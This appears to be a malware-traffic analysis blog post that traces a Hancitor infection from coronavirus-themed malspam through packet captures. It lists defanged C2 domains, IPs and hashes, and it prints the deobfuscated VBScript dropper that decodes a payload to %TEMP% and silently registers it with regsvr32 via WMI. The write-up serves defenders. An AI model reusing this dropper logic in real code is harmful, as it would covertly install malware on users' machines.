# 3/20/2020 - Hancitor Infection w/Coronavirus Themed Malspam
- [Packets](http://malware-traffic-analysis.net/2020/03/11/index.html)
- [Hancitor Downloader background (AKA Chanitor)](https://www.cyber.nj.gov/threat-profiles/trojan-variants/hancitor)

Unless you've been living under a rock, you're aware of the global COVID-19 pandemic, also known as Coronavirus...actually...even if you're under a rock, you're still likely aware. Adversaries commonly capitalize on these type of events for their malspam lures, [COVID is no different](https://krebsonsecurity.com/2020/03/live-coronavirus-map-used-to-spread-malware/). If the bad guys are using this, as defenders, we need to be prepared. In this situation, malspam is used to distribute the Hancitor (Chanitor) downloader. @mesa_matt reported this wave of COVID malspam [here](https://twitter.com/mesa_matt/status/1237808758669094913) and then by [SANS](https://isc.sans.edu/forums/diary/Hancitor+distributed+through+coronavirusthemed+malspam/25892/).

*Note: Before we get started, there is a VBScript here that I was not able to fully unpack. It's a bit beyond my skills as a network forensic analyst, so if anyone wants it and can help me understand more about it, I'd be eternally grateful to learn from you.*

We'll start over on the Suricata dashboard to see if anything look suspicious, and as per normal, we have a hint of where to start with the `ET MALWARE Fareit/Pony Downloader Checkin 2` alert. As we commonly see with these infections, adversaries frequently do an external IP lookup to see where they are and/or to validate they've infected the right victim (for targeted intrusions); that said, remember that an external IP lookup, while interesting, isn't a smoking gun - so we'll put that in the "interesting" vs. the "evidence" pile.

![](/images/3-20-20-1.png)

Filtering on the Pony Downloader alert, we can see that `10.3.11.101` looks like the internal host as well as `45[.]153[.]73[.]33` as the, we'll call it C2 because the alert calls it `Downloader Checkin 2`, external host of interest. Of note, this connection is over port `80`, so we should have good metadata to dig through. We'll also use the HTTP dashboard to see what it can tell us.

![](/images/3-20-20-2.png)

Before we move away from the Suricata dashboard, the alert is called Pony, which is part of the process that Hanciator uses to burrow into an infected system - usually Pony is delivered via a macro-enabled document, with a VBScript, that acts as an installer to download Pony and then Hancitor [1](https://www.reddit.com/r/blackhat/comments/5oee1h/what_is_a_pony_downloader/), [2](https://www.proofpoint.com/us/threat-insight/post/hancitor-ruckguv-reappear), [3](https://www.fireeye.com/blog/threat-research/2016/09/hancitor_aka_chanit.html). Using that OSINT, we know that we're probably looking for a VB macro, which likely means an Office document.

Okay, lets pop on over to ROCK's HTTP dashboard and see what we can learn about `45[.]153[.]73[.]33`. Here when we apply the filter for our bad IP address, we can see the HOST (`thumbeks[.]com`) and the URI's...all PHP files (`/4/forum[.]php`, `/d2/about[.]php`, `/mlu/forum[.]php`). [PHP](https://www.php.net/) is a web-centric scripting language that is perfect for all kinds of useful applications...and malware.

![](/images/3-20-20-3.png)

Applying different filters to this dashboard shows that `10.3.11.101` and `45[.]153[.]73[.]33` are the only two systems talking back and forth with `thumbeks[.]com`, so lets look in the Discover app to learn a bit more.

I've searched for the host that we're interested in and applied the `http` dataset filter. Of note, I've added fields that I'm most interested in source IP, URL, etc. but I've also added the `Query PCAP` field so that I can use that to quickly carve the packets using Docket and Stenographer, both built into RockNSM. This traffic is over port 80 and likely unencrypted, so we should be able to get some good data from it. Finally, we'll know more when we look at the HTTP headers, but the HTTP Method is a POST, so this is likely data exfil or a checkin of some type.

![](/images/3-20-20-4.png)

I'll carve the PCAPs for `/4/forum[.]php`, `/d2/about[.]php`, and `/mlu/forum[.]php` to analyze them.

With the first `/4/forum[.]php`, we can see that this is uploading a GUID and build number of the implant along with the hostname (`[redacted]-WIN10`), the userID (`[redacted]-WIN10\[username]`) and the host IP address (`IP=[redacted]`) along with a Base64 encoded string

```
This is followed by posting binary files from `/d2/about[.]php` and `/mlu/forum[.]php`

![](/images/3-20-20-5.png)
![](/images/3-20-20-6.png)
![](/images/3-20-20-7.png)

After the initial `/4/forum[.]php` + `/d2/about[.]php` + `/mlu/forum[.]php`, there are 3 more POSTs to `/4/forum[.]php` which have 2 different Base64 encoded strings (`CMNXARRABw==` and `AZAZARRABw==`). In checking online for those strings, there was 1 link to [Hybrid-Analysis](https://www.hybrid-analysis.com/sample/fdbc89d95c002985f71ef3a8471bded05e71559874f36dd12186def8eef73e81?environmentId=100) for a Hancitor analysis from 2018 (we knew this was Hancitor already, but this is the first evidence pointing us that direction).

Now that we have a good hit regarding `thumbeks[.]com`, let's remove `thumbeks[.]com`, `/4/forum[.]php`, `/d2/about[.]php`, and `/mlu/forum[.]php` and move onto other suspicious traffic.

When looking at the remaining traffic, it became pretty obvious that there was more than I could just sift through in the Discover app and honestly say I found bad traffic. So, let's profile the DNS traffic, use a data table visualization, and remove the IP lookup API (`api.ipify.org` and `thumbeks[.]com`...ah, 2 entries and we now have 4 additional indicators to research to see if they are bad (2 hosts, 2 IPs)

![](/images/3-20-20-8.png)

Lets start with the hosts (`freetospeak[.]me` and `shop[.]artaffinittee[.]com`) and see what else we know about them. Looking at the DNS, domains, and files, we can see that there is a file located at `freetospeak[.]me/0843_43[.]php`, but the filename is `SE-670131329809_5500[.]zip`.

![](/images/3-20-20-9.png)

Before we move further into `freetospeak[.]me`, let's look at that IP address (`8[.]208[.]77[.]171`) and see if anyone else communicated with that IP and no one did. This is the proper process for analysis, but sometimes there's not any additional data.

Moving on, we'll grab the packets to see what's there, but in doing a quick Google search for `0843_43.php` I can see that [Abuse.ch](https://urlhaus.abuse.ch/url/323970/) has listed some of the payloads that are delivered from this URI and they follow what we've observed - two capital letters, a dash, 12 numbers, an underscore, 4 numbers, and a zip file extension. We'll have a regex search in the Detection Logic section, but lets check out the packets.

![](/images/3-20-20-10.png)

Lets use the Export HTTP Object of Wireshark to grab that file so we can do some additional analysis. Running the `file` command, we see that this isn't a PHP file, but a zip archive (we assumed that based on the file.name field in ROCK, but that's why we check).

```
/usr/bin/file 0843_43.php
0843_43.php: Zip archive data, at least v2.0 to extract
```

Great, let's grab some metadata about the file with `exiftool`.

```
/usr/local/bin/exiftool 0843_43.php
ExifTool Version Number         : 11.85
File Name                       : 0843_43.php

Zip File Name                   : SE670131329809.vbs
```
We can see that the `Zip File Name` contains `SE670131329809.vbs`. Interesting! Let's list the contents of the zip file and see if there's anything else interesting in there.
```
/usr/bin/unzip -l 0843_43.php
Archive:  0843_43.php
  Length      Date    Time    Name
---------  ---------- -----   ----
  1130515  03-10-2020 19:22   SE670131329809.vbs
---------                     -------
  1130515                     1 file
```
We can see that the archive was created on March 10, 2020 and that there is one file in there (`SE670131329809.vbs`). Let's unzip and poke around on the file.
```
/usr/bin/unzip -K 0843_43.php
Archive:  0843_43.php
  inflating: SE670131329809.vbs
```
Now, let's grab the hash of this script and see if anyone else has already done the hard work.
```
/sbin/md5 SE670131329809.vbs
MD5 (SE670131329809.vbs) = 8eb933c84e7777c7b623f19489a59a2a
```
As it would turn out, it looks like someone has already submitted this to [VirusTotal](https://www.virustotal.com/gui/file/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51/detection) and its got a 20/59 score, so this looks like a good hit! As we continue to look at the [behavior](https://www.virustotal.com/gui/file/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51/behavior/Lastline) of this file, it looks like it's responsible for our connections to `thumbeks[.]com` and `api[.]ipify[.]org` (this is great because now we have a real reason to look at IPIFY, whereas before it was just suspicious, but now we can connect it to malware, so we can dig into that more), and a new domain (`cludions[.]com` - but we don't have any traffic to that domain in our sample). Of note, VT has some neat node analysis of this sample [here](https://www.virustotal.com/graph/6897a3b85046ba97fb3868dfb82338e5ed098136720a6cf73625e784fc1e1e51).

Now that we've got a solid line between IPIFY and our infected host, so let's see who communicated with that external service. It doesn't look like anyone beyond our known infected host did, but this is an example of connecting something suspicious to known bad. We don't do figurative hand-waving here, so it was good to make that association.

Before we move on, let's take a look at the VBScript. I'll caveat it with the fact that we'll just going to look and see if there's anything of value here vs. trying to RE it.

First off, looking at the metadata, it appears that it was also created on 3/10 (same as the time that it was added to the zip archive it was stored in). It's unclear if this was an automated process, indicating this is a process to create mass volumes of files for multple campaigns...but based on what was observed [online](https://urlhaus.abuse.ch/url/323970/), this is likely auto-created and archived.

It contains a bunch of numbers+`l` at the beginning and end of the script. TBH, I'm not entirely sure what that is used for...maybe a wayward Internet researcher may be able to add some context?
```

```
There's also a huge variable defined with a `Split`
```
SsfkRq=Split("108,121,175,31,34,31,31,31,35,31...
```
Beyond the basics of what a `Split` is, I'm not sure what that is doing. It is referenced below with `.WriteText YZyNjfA(SsfkRq)`

Stripping all that out, we're left with:
```
Function YZyNjfA(YRMVEpWm)
svNcfFav=""
'Function siahdgfkiqadsf
ZBgKJYn=0
adsfsdasd=31
'numbers=3782347438234
'UBoundWhileFunctionEnds
Do While ZBgKJYn =< UBound(YRMVEpWm)
svNcfFav=svNcfFav+ChrW(YRMVEpWm(ZBgKJYn)-adsfsdasd)
'End Function
ZBgKJYn=ZBgKJYn+1
Loop
'.Close
YZyNjfA=svNcfFav
End Function
Dim GtYbDTHjR: Set GtYbDTHjR=CreateObject("Scripting.FileSystemObject"): Dim etEWDmZOL: Set etEWDmZOL=CreateObject("ADODB.Stream")
With etEWDmZOL
.Type=2
.Charset="ISO-8859-1"
.Open()
.WriteText YZyNjfA(SsfkRq)

.Position=0
.SaveToFile CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)+"\")+"adobe.txt", 2
.Close
End With
Set HeJddyu=GetObject("winmgmts:Win32_Process")
With HeJddyu
.Create "regsvr32.exe -s "+CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(Cint("2"))+"\")+"adobe.txt",,,processid
End With
```

This is a bit beyond my bailiwick of network analysis, but it appears that it is a timer that counts down by `31`, listens to a stream for a file that it writes as `abobe.txt`, and finally the file is registered as a DLL on the system.

So, that's great, but I wasn't able to extract `adobe.txt` without some help. I called in a lifeline with the great Dustin Lee (@_dustinlee) who suggested (correctly) to remove the part of the script that actually executes the binary and it should drop it in the `%TEMP%`directory as denoted by `.SaveToFile CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)+"\")+"adobe.txt", 2`. So, I removed the following:

```
Set HeJddyu=GetObject("winmgmts:Win32_Process")
With HeJddyu
.Create "regsvr32.exe -s "+CStr(WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(Cint("2"))+"\")+"adobe.txt",,,processid
End With
```
After removing that, I ran `cscript SE670131329809.vbs`, and there in `%USERPROFILE%\AppData\Local\Temp` was `adobe.txt`! Phew...from my foxhole, quite a hard fought collection.

Okay, let's look at the metadata here. Of note, it's a DLL (which we expected from the DLL registration routine in the script `Create "regsvr32.exe -s "`), it's called "Windows Media Center Store ipdate Manager" (looks like a typo - nice indicator to search for).

Grabbing a quick hash and checking it on VirusTotal identified this as [Hancitor](https://www.virustotal.com/gui/file/291a4eb06358eca87fbc1f133ee162b6c532f4ec3e6f39c2646cde5de60e80f9/detection)!

Okay, moving on to `shop[.]artaffinittee[.]com`, which as a reminder, we identified this by profiling DNS traffic above.

There are three things that we can dig into:

- `/wp-includes/sodium_compat/1` - `19fe0b844a00c57f60a0d9d29e6974e7`
- `/wp-includes/sodium_compat/2` - `204f36fb236065964964a61d4d7b1b9c`
- `shop[.]artaffinittee[.]com`'s IP address of `68[.]183[.]232[.]255`

Let's first see if anyone else went that IP address, which they didn't, so we can list that as an indicator, but there's nothing else to dig in there (we'll do some IP analysis towards the end).

![](/images/3-20-20-11.png)

Grabbing the packets for `/wp-includes/sodium_compat/{1,2}`, we can see that we're dealing with a binary file that we can probably do some analysis of.

![](/images/3-20-20-12.png)

When pulling the files apart, they're binary files but they seem like they're into the RE category, which is beyond my capabilities. Of note, they are listed as indicators by a DigitalSide OSINT TI list.

## Summary
So, using ROCK, we identified a malicious domain that led us all the way back through the compromise to the initial point of infection and collected several observations along the way. Check out the detection logic for signatures and analysis.
